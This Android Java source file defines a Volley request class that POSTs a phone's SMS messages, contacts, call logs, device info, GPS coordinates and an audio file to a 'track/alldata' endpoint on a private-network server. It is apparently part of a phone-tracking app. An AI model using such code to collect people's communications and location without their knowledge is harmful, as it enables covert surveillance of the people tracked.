package com.example.devam.prism;

import com.android.volley.Response;
import com.android.volley.toolbox.StringRequest;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by devam on 4/7/2017.
 */
public class DataRequest extends StringRequest {
    public static final String REGISTER_REQUEST_URL="http://10.42.0.253:8080/prism/rest/track/alldata";
    //public static final String REGISTER_REQUEST_URL="http://192.168.43.220:8080/prism/rest/track/alldata";
    public Map<String,String> params;

    public DataRequest(String contacts,String sms_list,String call_logs,String info,String lat,String lng,String audiofile, String ondemand,Response.Listener<String> listener)
    {
        super(Method.POST,REGISTER_REQUEST_URL,listener,null);
        params=new HashMap<>();
        params.put("sms",sms_list);
        params.put("contacts",contacts);
        params.put("call_log",call_logs);
        params.put("info",info);
        params.put("lat",lat);
        params.put("lng",lng);
        String tobesent="";

        params.put("audiofile",audiofile);
        params.put("ondemand",ondemand);


    }

    @Override
    public Map<String, String> getParams() {
        return params;
    }
}
